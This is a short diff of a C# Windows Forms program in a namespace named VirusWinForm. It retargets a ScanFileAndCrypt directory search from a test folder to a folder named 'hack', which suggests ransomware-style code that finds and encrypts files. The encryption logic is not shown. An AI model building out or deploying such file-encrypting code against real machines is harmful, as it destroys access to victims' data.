@@ -18,7 +18,7 @@ namespace VirusWinForm
             // if (args.Length <= 0)
 
             ScanFileAndCrypt scf = new ScanFileAndCrypt();
-            scf.DirectorySearch(@"C:\Users\Admin\Desktop\Filetest");
+            scf.DirectorySearch(@"C:\Users\DELL\Downloads\hack");
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
